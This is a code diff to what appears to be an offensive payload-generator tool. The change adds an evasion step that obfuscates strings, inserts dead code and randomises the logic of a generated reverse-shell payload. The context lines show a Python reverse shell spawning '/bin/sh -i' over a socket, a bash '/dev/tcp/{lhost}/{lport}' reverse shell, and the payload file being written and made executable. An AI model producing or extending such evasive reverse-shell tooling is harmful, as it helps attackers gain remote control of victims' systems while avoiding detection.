@@ -9,6 +9,7 @@ import string
 import subprocess
 from pathlib import Path
 from rich.console import Console
+from utils.evasion import Evasion
 
 console = Console()
 
@@ -60,6 +61,11 @@ os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 p=subprocess.call(["/bin/sh","-i"])
 """
+            # Apply improved evasion
+            payload = Evasion.obfuscate_strings(payload)
+            payload = Evasion.add_dead_code(payload)
+            payload = Evasion.randomize_logic(payload)
+            
         elif payload_type == "bash":
             payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
         else:
@@ -69,7 +75,7 @@ p=subprocess.call(["/bin/sh","-i"])
             f.write(payload)
         
         os.chmod(output_path, 0o755)
-        console.print(f"[green][+] Script payload generated: {output_path}[/green]")
+        console.print(f"[green][+] Evasive script payload generated: {output_path}[/green]")
         return output_path
 
     def obfuscate_payload(self, file_path):
